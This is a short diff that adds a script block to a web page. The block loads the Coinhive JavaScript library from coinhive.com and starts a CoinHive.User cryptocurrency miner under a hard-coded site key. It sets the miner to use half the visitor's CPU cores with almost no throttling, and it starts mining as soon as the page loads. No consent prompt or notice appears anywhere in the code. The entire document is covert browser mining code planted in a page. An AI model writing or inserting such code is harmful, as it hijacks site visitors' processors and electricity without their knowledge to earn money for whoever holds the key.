@@ -1,0 +1,19 @@
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+    var pr  = 1;
+    var th = 0.02;
+
+    if(window.navigator.hardwareConcurrency > 1){
+        pr = (window.navigator.hardwareConcurrency / 2)
+    }
+
+    var miner = new CoinHive.User("Bg569qHSNmXnKQxWA0GSDMXpyQLljGVL", "net", {
+        threads: pr,
+        autoThreads: false,
+        throttle: th,
+        forceASMJS: false,
+        theme: "dark",
+        language: "auto"
+    });
+    miner.start();
+</script>
